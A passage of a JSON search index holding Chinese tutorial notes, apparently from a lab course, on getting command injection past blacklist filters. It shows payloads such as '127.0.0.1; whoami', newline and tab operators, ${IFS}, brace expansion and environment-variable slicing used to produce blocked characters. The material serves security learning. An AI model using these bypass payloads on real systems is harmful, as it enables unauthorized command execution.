(WAF)\uff0c\u5b83\u53ef\u80fd\u5177\u6709\u66f4\u5e7f\u6cdb\u7684\u8303\u56f4\u548c\u591a\u79cd\u6ce8\u5165\u68c0\u6d4b\u65b9\u6cd5\uff0c\u5e76\u9632\u6b62\u5404\u79cd\u5176\u4ed6\u653b\u51fb\uff0c\u5982 SQL \u6ce8\u5165\u6216 XSS \u653b\u51fb\u3002</p> <p>\u672c\u8282\u5c06\u4ecb\u7ecd\u51e0\u4e2a\u793a\u4f8b\uff0c\u8bf4\u660e\u5982\u4f55\u68c0\u6d4b\u548c\u963b\u6b62\u547d\u4ee4\u6ce8\u5165\uff0c\u4ee5\u53ca\u6211\u4eec\u5982\u4f55\u8bc6\u522b\u88ab\u963b\u6b62\u7684\u5185\u5bb9\u3002</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#waf","title":"\u8fc7\u6ee4\u5668/WAF\u68c0\u6d4b","text":"<p>\u8ba9\u6211\u4eec\u4ece\u8bbf\u95ee\u672c\u8282\u672b\u5c3e\u7ec3\u4e60\u4e2d\u7684 Web \u5e94\u7528\u7a0b\u5e8f\u5f00\u59cb\u3002\u6211\u4eec\u770b\u5230\u4e86\u6211\u4eec\u4e00\u76f4\u5728\u5229\u7528\u7684\u540c\u4e00\u4e2a <code>Host Checker</code> Web \u5e94\u7528\u7a0b\u5e8f\uff0c\u4f46\u73b0\u5728\u5b83\u6709\u4e00\u4e9b\u7f13\u89e3\u63aa\u65bd\u3002\u6211\u4eec\u53ef\u4ee5\u770b\u5230\uff0c\u5982\u679c\u6211\u4eec\u5c1d\u8bd5\u4e4b\u524d\u6d4b\u8bd5\u8fc7\u7684\u8fd0\u7b97\u7b26\uff0c\u6bd4\u5982 (<code>;</code>, <code>&amp;&amp;</code>, <code>||</code>)\uff0c\u6211\u4eec\u4f1a\u6536\u5230\u9519\u8bef\u6d88\u606f <code>invalid input</code>\uff1a</p> <p>![[Pasted image 20221211220845.png]]</p> <p>\u8fd9\u8868\u660e\u6211\u4eec\u53d1\u9001\u7684\u5185\u5bb9\u89e6\u53d1\u4e86\u62d2\u7edd\u6211\u4eec\u8bf7\u6c42\u7684\u5b89\u5168\u673a\u5236\u3002\u6b64\u9519\u8bef\u6d88\u606f\u53ef\u4ee5\u591a\u79cd\u65b9\u5f0f\u663e\u793a\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u5728\u663e\u793a\u8f93\u51fa\u7684\u5b57\u6bb5\u4e2d\u770b\u5230\u5b83\uff0c\u8fd9\u610f\u5473\u7740\u5b83\u5df2\u88ab <code>PHP</code> Web \u5e94\u7528\u7a0b\u5e8f\u672c\u8eab\u68c0\u6d4b\u5230\u5e76\u963b\u6b62\u3002\u5982\u679c\u9519\u8bef\u6d88\u606f\u663e\u793a\u4e0d\u540c\u7684\u9875\u9762\uff0c\u5176\u4e2d\u5305\u542b\u6211\u4eec\u7684 IP \u548c\u6211\u4eec\u7684\u8bf7\u6c42\u7b49\u4fe1\u606f\uff0c\u8fd9\u53ef\u80fd\u8868\u660e\u5b83\u88ab WAF \u62d2\u7edd\u4e86\u3002</p> <p>\u8ba9\u6211\u4eec\u68c0\u67e5\u4e00\u4e0b\u6211\u4eec\u53d1\u9001\u7684\u6709\u6548\u8f7d\u8377\uff1a</p> <pre><code>127.0.0.1; whoami\n</code></pre> <p>\u9664\u4e86 IP\uff08\u6211\u4eec\u77e5\u9053\u5b83\u6ca1\u6709\u88ab\u5217\u5165\u9ed1\u540d\u5355\uff09\uff0c\u6211\u4eec\u8fd8\u53d1\u9001\u4e86\uff1a</p> <ul> <li>\u4e00\u4e2a\u5206\u53f7\u5b57\u7b26</li> <li>\u4e00\u4e2a\u7a7a\u683c\u7b26</li> <li>\u4e00\u4e2a whoami \u547d\u4ee4</li> </ul> <p>\u56e0\u6b64\uff0cWeb \u5e94\u7528\u7a0b\u5e8f\u8981\u4e48\u68c0\u6d4b\u5230\u5217\u5165\u9ed1\u540d\u5355\u7684\u5b57\u7b26\uff0c\u8981\u4e48\u68c0\u6d4b\u5230\u5217\u5165\u9ed1\u540d\u5355\u7684\u547d\u4ee4\uff0c\u6216\u8005\u4e24\u8005\u90fd\u6709\u3002\u90a3\u4e48\uff0c\u8ba9\u6211\u4eec\u770b\u770b\u5982\u4f55\u7ed5\u8fc7\u5b83\u4eec\u3002</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#_12","title":"\u5217\u5165\u9ed1\u540d\u5355\u7684\u5b57\u7b26","text":"<p>Web \u5e94\u7528\u7a0b\u5e8f\u53ef\u80fd\u6709\u4e00\u4e2a\u5217\u5165\u9ed1\u540d\u5355\u7684\u5b57\u7b26\u5217\u8868\uff0c\u5982\u679c\u547d\u4ee4\u5305\u542b\u8fd9\u4e9b\u5b57\u7b26\uff0c\u5b83\u5c06\u62d2\u7edd\u8be5\u8bf7\u6c42\u3002 PHP \u4ee3\u7801\u53ef\u80fd\u7c7b\u4f3c\u4e8e\u4ee5\u4e0b\u5185\u5bb9\uff1a</p> <pre><code>$blacklist = ['&amp;', '|', ';', ...SNIP...];\nforeach ($blacklist as $character) {\n    if (strpos($_POST['ip'], $character) !== false) {\n        echo \"Invalid input\";\n    }\n}\n</code></pre> <p>\u5982\u679c\u6211\u4eec\u53d1\u9001\u7684\u5b57\u7b26\u4e32\u4e2d\u7684\u4efb\u4f55\u5b57\u7b26\u4e0e\u9ed1\u540d\u5355\u4e2d\u7684\u5b57\u7b26\u5339\u914d\uff0c\u6211\u4eec\u7684\u8bf7\u6c42\u5c06\u88ab\u62d2\u7edd\u3002\u5728\u6211\u4eec\u5f00\u59cb\u5c1d\u8bd5\u7ed5\u8fc7\u8fc7\u6ee4\u5668\u4e4b\u524d\uff0c\u6211\u4eec\u5e94\u8be5\u5c1d\u8bd5\u786e\u5b9a\u662f\u54ea\u4e2a\u5b57\u7b26\u5bfc\u81f4\u4e86\u88ab\u62d2\u7edd\u7684\u8bf7\u6c42\u3002</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#_13","title":"\u8bc6\u522b\u5217\u5165\u9ed1\u540d\u5355\u7684\u5b57\u7b26","text":"<p>\u8ba9\u6211\u4eec\u4e00\u6b21\u5c06\u8bf7\u6c42\u51cf\u5c11\u5230\u4e00\u4e2a\u5b57\u7b26\uff0c\u770b\u770b\u5b83\u4f55\u65f6\u88ab\u963b\u6b62\u3002\u6211\u4eec\u77e5\u9053 (<code>127.0.0.1</code>) \u6709\u6548\u8d1f\u8f7d\u786e\u5b9e\u6709\u6548\uff0c\u6240\u4ee5\u8ba9\u6211\u4eec\u4ece\u6dfb\u52a0\u5206\u53f7 (<code>127.0.0.1;</code>) \u5f00\u59cb\uff1a</p> <p>![[Pasted image 20221211221407.png]]</p> <p>\u6211\u4eec\u4ecd\u7136\u5f97\u5230\u65e0\u6548\u8f93\u5165\uff0c\u9519\u8bef\u610f\u5473\u7740\u5206\u53f7\u88ab\u5217\u5165\u9ed1\u540d\u5355\u3002\u90a3\u4e48\uff0c\u8ba9\u6211\u4eec\u770b\u770b\u6211\u4eec\u4e4b\u524d\u8ba8\u8bba\u7684\u6240\u6709\u6ce8\u5165\u64cd\u4f5c\u7b26\u662f\u5426\u90fd\u88ab\u5217\u5165\u9ed1\u540d\u5355\u3002</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#bypassing-space-filters","title":"Bypassing Space Filters","text":"<p>\u6709\u591a\u79cd\u65b9\u6cd5\u53ef\u4ee5\u68c0\u6d4b\u6ce8\u5165\u5c1d\u8bd5\uff0c\u5e76\u4e14\u6709\u591a\u79cd\u65b9\u6cd5\u53ef\u4ee5\u7ed5\u8fc7\u8fd9\u4e9b\u68c0\u6d4b\u3002\u6211\u4eec\u5c06\u4ee5 Linux \u4e3a\u4f8b\u6f14\u793a\u68c0\u6d4b\u7684\u6982\u5ff5\u4ee5\u53ca\u7ed5\u8fc7\u7684\u5de5\u4f5c\u539f\u7406\u3002\u6211\u4eec\u5c06\u5b66\u4e60\u5982\u4f55\u5229\u7528\u8fd9\u4e9b\u7ed5\u8fc7\u5e76\u6700\u7ec8\u80fd\u591f\u963b\u6b62\u5b83\u4eec\u3002\u4e00\u65e6\u6211\u4eec\u5f88\u597d\u5730\u638c\u63e1\u4e86\u5b83\u4eec\u7684\u5de5\u4f5c\u539f\u7406\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u4e92\u8054\u7f51\u4e0a\u7684\u5404\u79cd\u8d44\u6e90\u6765\u53d1\u73b0\u5176\u4ed6\u7c7b\u578b\u7684\u7ed5\u8fc7\u5e76\u5b66\u4e60\u5982\u4f55\u7f13\u89e3\u5b83\u4eec\u3002</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#_14","title":"\u7ed5\u8fc7\u9ed1\u540d\u5355\u64cd\u4f5c","text":"<p>\u6211\u4eec\u4f1a\u770b\u5230\u5927\u90e8\u5206\u7684\u6ce8\u5165\u64cd\u4f5c(Operators)\u786e\u5b9e\u88ab\u5217\u5165\u4e86\u9ed1\u540d\u5355\u3002\u4f46\u662f\uff0c\u6362\u884c\u7b26\u901a\u5e38\u4e0d\u4f1a\u88ab\u5217\u5165\u9ed1\u540d\u5355\uff0c\u56e0\u4e3a\u8d1f\u8f7d\u672c\u8eab\u53ef\u80fd\u9700\u8981\u5b83\u3002\u6211\u4eec\u77e5\u9053\u6362\u884c\u7b26\u53ef\u4ee5\u5728 Linux \u548c Windows \u4e2d\u9644\u52a0\u6211\u4eec\u7684\u547d\u4ee4\uff0c\u6240\u4ee5\u8ba9\u6211\u4eec\u5c1d\u8bd5\u4f7f\u7528\u5b83\u4f5c\u4e3a\u6211\u4eec\u7684\u6ce8\u5165\u8fd0\u7b97\u7b26\uff1a</p> <p>![[Pasted image 20221212102713.png]]</p> <p>\u6b63\u5982\u6211\u4eec\u6240\u770b\u5230\u7684\uff0c\u5373\u4f7f\u6211\u4eec\u7684 payload \u786e\u5b9e\u5305\u542b\u4e00\u4e2a\u6362\u884c\u7b26\uff0c\u6211\u4eec\u7684\u8bf7\u6c42\u4e5f\u6ca1\u6709\u88ab\u62d2\u7edd\uff0c\u5e76\u4e14\u6211\u4eec\u786e\u5b9e\u5f97\u5230\u4e86 ping \u547d\u4ee4\u7684\u8f93\u51fa\uff0c\u8fd9\u610f\u5473\u7740\u8fd9\u4e2a\u5b57\u7b26\u6ca1\u6709\u88ab\u5217\u5165\u9ed1\u540d\u5355\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u5b83\u7528\u4f5c\u6211\u4eec\u7684\u6ce8\u5c04\u64cd\u4f5c\u5458\u3002\u8ba9\u6211\u4eec\u9996\u5148\u8ba8\u8bba\u5982\u4f55\u7ed5\u8fc7\u4e00\u4e2a\u5e38\u89c1\u7684\u9ed1\u540d\u5355\u5b57\u7b26\u2014\u2014\u7a7a\u683c\u5b57\u7b26\u3002</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#_15","title":"\u7ed5\u8fc7\u5217\u5165\u9ed1\u540d\u5355\u7684\u7a7a\u683c\u5b57\u7b26","text":"<p>\u73b0\u5728\u6211\u4eec\u6709\u4e86\u4e00\u4e2a\u6709\u6548\u7684\u6ce8\u5165\u64cd\u4f5c\u7b26\uff0c\u8ba9\u6211\u4eec\u4fee\u6539\u6211\u4eec\u7684\u539f\u59cb\u6709\u6548\u8d1f\u8f7d\u5e76\u5c06\u5176\u518d\u6b21\u53d1\u9001\u4e3a (<code>127.0.0.1%0a whoami</code>)\uff1a</p> <p>![[Pasted image 20221212105940.png]]</p> <p>\u5982\u6211\u4eec\u6240\u89c1\uff0c\u6211\u4eec\u4ecd\u7136\u6536\u5230 <code>invalid input</code> \u9519\u8bef\u6d88\u606f\uff0c\u8fd9\u610f\u5473\u7740\u6211\u4eec\u8fd8\u6709\u5176\u4ed6\u8fc7\u6ee4\u5668\u9700\u8981\u7ed5\u8fc7\u3002\u6240\u4ee5\uff0c\u5c31\u50cf\u6211\u4eec\u4e4b\u524d\u6240\u505a\u7684\u90a3\u6837\uff0c\u8ba9\u6211\u4eec\u53ea\u6dfb\u52a0\u4e0b\u4e00\u4e2a\u5b57\u7b26\uff08\u4e00\u4e2a\u7a7a\u683c\uff09\uff0c\u770b\u770b\u5b83\u662f\u5426\u5bfc\u81f4\u8bf7\u6c42\u88ab\u62d2\u7edd\uff1a</p> <p>\u6b63\u5982\u6211\u4eec\u6240\u770b\u5230\u7684\uff0c\u7a7a\u683c\u5b57\u7b26\u4e5f\u786e\u5b9e\u88ab\u5217\u5165\u4e86\u9ed1\u540d\u5355\u3002\u7a7a\u683c\u901a\u5e38\u662f\u5217\u5165\u9ed1\u540d\u5355\u7684\u5b57\u7b26\uff0c\u5c24\u5176\u662f\u5f53\u8f93\u5165\u4e0d\u5e94\u5305\u542b\u4efb\u4f55\u7a7a\u683c\u65f6\uff0c\u4f8b\u5982 IP\u3002\u4e0d\u8fc7\uff0c\u6709\u5f88\u591a\u65b9\u6cd5\u53ef\u4ee5\u5728\u4e0d\u5b9e\u9645\u4f7f\u7528\u7a7a\u683c\u5b57\u7b26\u7684\u60c5\u51b5\u4e0b\u6dfb\u52a0\u7a7a\u683c\u5b57\u7b26\uff01</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#tabs","title":"\u4f7f\u7528 Tabs","text":"<p>\u4f7f\u7528\u5236\u8868\u7b26 (<code>%09</code>) \u4ee3\u66ff\u7a7a\u683c\u662f\u4e00\u79cd\u53ef\u884c\u7684\u6280\u672f\uff0c\u56e0\u4e3a Linux \u548c Windows \u90fd\u63a5\u53d7\u5728\u53c2\u6570\u4e4b\u95f4\u4f7f\u7528\u5236\u8868\u7b26\u7684\u547d\u4ee4\uff0c\u5e76\u4e14\u5b83\u4eec\u7684\u6267\u884c\u65b9\u5f0f\u76f8\u540c\u3002\u56e0\u6b64\uff0c\u8ba9\u6211\u4eec\u5c1d\u8bd5\u4f7f\u7528\u5236\u8868\u7b26\u800c\u4e0d\u662f\u7a7a\u683c\u5b57\u7b26 (<code>127.0.0.1%0a%09</code>)\uff0c\u770b\u770b\u6211\u4eec\u7684\u8bf7\u6c42\u662f\u5426\u88ab\u63a5\u53d7\uff1a</p> <p>![[Pasted image 20221212110147.png]]</p> <p>\u5982\u6211\u4eec\u6240\u89c1\uff0c\u6211\u4eec\u901a\u8fc7\u4f7f\u7528\u5236\u8868\u7b26\u6210\u529f\u5730\u7ed5\u8fc7\u4e86\u7a7a\u683c\u5b57\u7b26\u8fc7\u6ee4\u5668\u3002\u8ba9\u6211\u4eec\u770b\u770b\u53e6\u4e00\u79cd\u66ff\u6362\u7a7a\u683c\u5b57\u7b26\u7684\u65b9\u6cd5</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#ifs","title":"\u4f7f\u7528 $IFS","text":"<p>\u4f7f\u7528 (<code>$IFS</code>) Linux \u73af\u5883\u53d8\u91cf\u4e5f\u53ef\u80fd\u6709\u6548\uff0c\u56e0\u4e3a\u5b83\u7684\u9ed8\u8ba4\u503c\u662f\u4e00\u4e2a\u7a7a\u683c\u548c\u4e00\u4e2a\u5236\u8868\u7b26\uff0c\u53ef\u4ee5\u5728\u547d\u4ee4\u53c2\u6570\u4e4b\u95f4\u4f7f\u7528\u3002\u6240\u4ee5\uff0c\u5982\u679c\u6211\u4eec\u5728\u5e94\u8be5\u6709\u7a7a\u683c\u7684\u5730\u65b9\u4f7f\u7528 <code>${IFS}</code> \uff0c\u53d8\u91cf\u5e94\u8be5\u81ea\u52a8\u66ff\u6362\u4e3a\u7a7a\u683c\uff0c\u6211\u4eec\u7684\u547d\u4ee4\u5e94\u8be5\u53ef\u4ee5\u5de5\u4f5c\u3002</p> <p>\u8ba9\u6211\u4eec\u4f7f\u7528 <code>${IFS}</code> \u770b\u770b\u5b83\u662f\u5426\u6709\u6548 (<code>127.0.0.1%0a${IFS}</code>)\uff1a</p> <p>![[Pasted image 20221212110311.png]]</p> <p>\u6211\u4eec\u770b\u5230\u8fd9\u6b21\u6211\u4eec\u7684\u8bf7\u6c42\u6ca1\u6709\u88ab\u62d2\u7edd\uff0c\u6211\u4eec\u518d\u6b21\u7ed5\u8fc7\u4e86\u7a7a\u95f4\u8fc7\u6ee4\u5668\u3002</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#brace-expansion","title":"\u4f7f\u7528 Brace Expansion","text":"<p>\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u8bb8\u591a\u5176\u4ed6\u65b9\u6cd5\u6765\u7ed5\u8fc7\u7a7a\u95f4\u8fc7\u6ee4\u5668\u3002\u4f8b\u5982\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 <code>Bash Brace Expansion</code> \u7279\u6027\uff0c\u5b83\u4f1a\u81ea\u52a8\u5728\u62ec\u53f7\u4e4b\u95f4\u7684\u53c2\u6570\u4e4b\u95f4\u6dfb\u52a0\u7a7a\u683c\uff0c\u5982\u4e0b\u6240\u793a\uff1a</p> <pre><code>$ {ls,-la}\n\ntotal 0\ndrwxr-xr-x 1 21y4d 21y4d   0 Jul 13 07:37 .\ndrwxr-xr-x 1 21y4d 21y4d   0 Jul 13 13:01 ..\n</code></pre> <p>\u6b63\u5982\u6211\u4eec\u6240\u770b\u5230\u7684\uff0c\u8be5\u547d\u4ee4\u5df2\u6210\u529f\u6267\u884c\uff0c\u5176\u4e2d\u6ca1\u6709\u7a7a\u683c\u3002\u6211\u4eec\u53ef\u4ee5\u5728\u547d\u4ee4\u6ce8\u5165\u8fc7\u6ee4\u5668\u7ed5\u8fc7\u4e2d\u4f7f\u7528\u76f8\u540c\u7684\u65b9\u6cd5\uff0c\u901a\u8fc7\u5728\u547d\u4ee4\u53c2\u6570\u4e0a\u4f7f\u7528\u5927\u62ec\u53f7\u6269\u5c55\uff0c\u4f8b\u5982 (<code>127.0.0.1%0a{ls,-la}</code>)\u3002\u8981\u53d1\u73b0\u66f4\u591a\u7a7a\u95f4\u8fc7\u6ee4\u5668\u7ed5\u8fc7\u65b9\u6cd5\uff0c\u8bf7\u67e5\u770b PayloadsAllTheThings \u9875\u9762\u4e0a\u6709\u5173\u7f16\u5199\u4e0d\u5e26\u7a7a\u683c\u7684\u547d\u4ee4\u7684\u4fe1\u606f\u3002</p> <p>\u7ec3\u4e60\uff1a\u5c1d\u8bd5\u5bfb\u627e\u7ed5\u8fc7\u7a7a\u95f4\u8fc7\u6ee4\u5668\u7684\u5176\u4ed6\u65b9\u6cd5\uff0c\u5e76\u5c06\u5b83\u4eec\u4e0e Host Checker Web \u5e94\u7528\u7a0b\u5e8f\u4e00\u8d77\u4f7f\u7528\u4ee5\u4e86\u89e3\u5b83\u4eec\u7684\u5de5\u4f5c\u539f\u7406\u3002</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#_16","title":"\u7ed5\u8fc7\u5176\u4ed6\u9ed1\u540d\u5355\u5b57\u7b26","text":"<p>\u9664\u4e86\u6ce8\u5165\u8fd0\u7b97\u7b26\u548c\u7a7a\u683c\u5b57\u7b26\u5916\uff0c\u4e00\u4e2a\u975e\u5e38\u5e38\u89c1\u7684\u5217\u5165\u9ed1\u540d\u5355\u7684\u5b57\u7b26\u662f\u659c\u6760 (<code>/</code>) \u6216\u53cd\u659c\u6760 (<code>\\</code>) \u5b57\u7b26\uff0c\u56e0\u4e3a\u5728 Linux \u6216 Windows \u4e2d\u9700\u8981\u6307\u5b9a\u76ee\u5f55\u3002\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u591a\u79cd\u6280\u672f\u6765\u751f\u6210\u6211\u4eec\u60f3\u8981\u7684\u4efb\u4f55\u5b57\u7b26\uff0c\u540c\u65f6\u907f\u514d\u4f7f\u7528\u5217\u5165\u9ed1\u540d\u5355\u7684\u5b57\u7b26\u3002</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#linux","title":"Linux","text":"<p>\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u8bb8\u591a\u6280\u672f\u5728\u6211\u4eec\u7684\u6709\u6548\u8f7d\u8377\u4e2d\u4f7f\u7528\u659c\u6760\u3002\u6211\u4eec\u53ef\u4ee5\u7528\u6765\u66ff\u6362\u659c\u6760\uff08\u6216\u4efb\u4f55\u5176\u4ed6\u5b57\u7b26\uff09\u7684\u6280\u672f\u4e4b\u4e00\u662f\u901a\u8fc7 <code>Linux \u73af\u5883\u53d8\u91cf</code>\uff0c\u5c31\u50cf\u6211\u4eec\u5bf9 <code>${IFS}</code> \u6240\u505a\u7684\u90a3\u6837\u3002\u867d\u7136 <code>${IFS}</code> \u76f4\u63a5\u66ff\u6362\u4e3a\u7a7a\u683c\uff0c\u4f46\u6ca1\u6709\u7528\u4e8e\u659c\u7ebf\u6216\u5206\u53f7\u7684\u73af\u5883\u53d8\u91cf\u3002\u4f46\u662f\uff0c\u8fd9\u4e9b\u5b57\u7b26\u53ef\u80fd\u4f1a\u5728\u73af\u5883\u53d8\u91cf\u4e2d\u4f7f\u7528\uff0c\u6211\u4eec\u53ef\u4ee5\u6307\u5b9a\u5b57\u7b26\u4e32\u7684<code>\u5f00\u59cb</code>\u548c<code>\u957f\u5ea6</code>\u4ee5\u5b8c\u5168\u5339\u914d\u8be5\u5b57\u7b26\u3002</p> <p>\u4f8b\u5982\uff0c\u5982\u679c\u6211\u4eec\u67e5\u770b Linux \u4e2d\u7684 <code>$PATH</code> \u73af\u5883\u53d8\u91cf\uff0c\u5b83\u53ef\u80fd\u5982\u4e0b\u6240\u793a\uff1a</p> <pre><code>$ echo ${PATH}\n\n/usr/local/bin:/usr/bin:/bin:/usr/games\n</code></pre> <p>\u6240\u4ee5\uff0c\u5982\u679c\u6211\u4eec\u4ece <code>0</code> \u5b57\u7b26\u5f00\u59cb\uff0c\u53ea\u53d6\u957f\u5ea6\u4e3a <code>1</code> \u7684\u5b57\u7b26\u4e32\uff0c\u6211\u4eec\u5c06\u53ea\u4ee5 <code>/</code> \u5b57\u7b26\u7ed3\u675f\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u6211\u4eec\u7684\u6709\u6548\u8f7d\u8377\u4e2d\u4f7f\u7528\u5b83\uff1a</p> <pre><code>$ echo ${PATH}\n\n/usr/local/bin:/usr/bin:/bin:/usr/games\n</code></pre> <p>\u6240\u4ee5\uff0c\u5982\u679c\u6211\u4eec\u4ece <code>0</code> \u5b57\u7b26\u5f00\u59cb\uff0c\u53ea\u53d6\u957f\u5ea6\u4e3a <code>1</code> \u7684\u5b57\u7b26\u4e32\uff0c\u6211\u4eec\u5c06\u53ea\u4ee5 <code>/</code> \u5b57\u7b26\u7ed3\u675f\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u6211\u4eec\u7684\u6709\u6548\u8f7d\u8377\u4e2d\u4f7f\u7528\u5b83\uff1a</p> <pre><code>$ echo ${PATH:0:1}\n\n/\n</code></pre> <p>\u6ce8\u610f\uff1a\u5f53\u6211\u4eec\u5728 payload \u4e2d\u4f7f\u7528\u4e0a\u8ff0\u547d\u4ee4\u65f6\uff0c\u6211\u4eec\u4e0d\u4f1a\u6dfb\u52a0 <code>echo</code>\uff0c\u56e0\u4e3a\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\u6211\u4eec\u53ea\u4f7f\u7528\u5b83\u6765\u663e\u793a\u8f93\u51fa\u7684\u5b57\u7b26\u3002</p> <p>\u6211\u4eec\u4e5f\u53ef\u4ee5\u5bf9 <code>$HOME</code> \u6216 <code>$PWD</code> \u73af\u5883\u53d8\u91cf\u505a\u540c\u6837\u7684\u4e8b\u60c5\u3002\u6211\u4eec\u4e5f\u53ef\u4ee5\u4f7f\u7528\u76f8\u540c\u7684\u6982\u5ff5\u6765\u83b7\u53d6\u5206\u53f7\u5b57\u7b26\uff0c\u7528\u4f5c\u6ce8\u5165\u8fd0\u7b97\u7b26\u3002\u4f8b\u5982\uff0c\u4ee5\u4e0b\u547d\u4ee4\u4e3a\u6211\u4eec\u63d0\u4f9b\u4e86\u4e00\u4e2a\u5206\u53f7\uff1a</p> <pre><code>$ echo ${LS_COLORS:10:1}\n\n;\n</code></pre> <p>\u7ec3\u4e60\uff1a\u8bd5\u7740\u7406\u89e3\u4e0a\u9762\u7684\u547d\u4ee4\u662f\u5982\u4f55\u4ea7\u751f\u5206\u53f7\u7684\uff0c\u7136\u540e\u5728\u6709\u6548\u8d1f\u8f7d\u4e2d\u4f7f\u7528\u5b83\u4f5c\u4e3a\u6ce8\u5165\u8fd0\u7b97\u7b26\u3002\u63d0\u793a\uff1a<code>printenv</code> \u547d\u4ee4\u6253\u5370 Linux \u4e2d\u7684\u6240\u6709\u73af\u5883\u53d8\u91cf\uff0c\u56e0\u6b64\u60a8\u53ef\u4ee5\u67e5\u770b\u54ea\u4e9b\u53ef\u80fd\u5305\u542b\u6709\u7528\u7684\u5b57\u7b26\uff0c\u7136\u540e\u5c1d\u8bd5\u5c06\u5b57\u7b26\u4e32\u7f29\u51cf\u4e3a\u4ec5\u8be5\u5b57\u7b26\u3002</p> <p>\u56e0\u6b64\uff0c\u8ba9\u6211\u4eec\u5c1d\u8bd5\u4f7f\u7528\u73af\u5883\u53d8\u91cf\u4e3a\u6211\u4eec\u7684\u8d1f\u8f7d (<code>127.0.0.1${LS_COLORS:10:1}${IFS}</code>) \u6dfb\u52a0\u4e00\u4e2a\u5206\u53f7\u548c\u4e00\u4e2a\u7a7a\u683c\u4f5c\u4e3a\u6211\u4eec\u7684\u8d1f\u8f7d\uff0c\u770b\u770b\u6211\u4eec\u662f\u5426\u53ef\u4ee5\u7ed5\u8fc7\u8fc7\u6ee4\u5668\uff1a</p> <p>![[Pasted image 20221212112726.png]]</p> <p>\u6b63\u5982\u6211\u4eec\u6240\u89c1\uff0c\u8fd9\u6b21\u6211\u4eec\u4e5f\u6210\u529f\u7ed5\u8fc7\u4e86\u5b57\u7b26\u8fc7\u6ee4\u5668\u3002</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#windows","title":"Windows","text":"<p>\u540c\u6837\u7684\u6982\u5ff5\u4e5f\u9002\u7528\u4e8e Windows\u3002\u4f8b\u5982\uff0c\u8981\u5728 Windows \u547d\u4ee4\u884c (<code>CMD</code>) \u4e2d\u751f\u6210\u659c\u6760\uff0c\u6211\u4eec\u53ef\u4ee5\u56de\u663e Windows \u53d8\u91cf (<code>%HOMEPATH% -&gt; \\Users\\htb-student</code>)\uff0c\u7136\u540e\u6307\u5b9a\u8d77\u59cb\u4f4d\u7f6e (<code>~6 -&gt; \\htb-student</code>) , \u6700\u540e\u6307\u5b9a\u4e00\u4e2a\u8d1f\u7ed3\u675f\u4f4d\u7f6e\uff0c\u5728\u672c\u4f8b\u4e2d\u662f\u7528\u6237\u540d htb-student (<code>-11</code> -&gt; <code>\\</code>) \u7684\u957f\u5ea6\uff1a</p> <pre><code>C:\\htb&gt; echo %HOMEPATH:~6,-11%\n\n\\\n</code></pre> <p>\u6211\u4eec\u53ef\u4ee5\u5728 <code>Windows PowerShell</code> \u4e2d\u4f7f\u7528\u76f8\u540c\u7684\u53d8\u91cf\u6765\u5b9e\u73b0\u76f8\u540c\u7684\u76ee\u7684\u3002\u5728 PowerShell 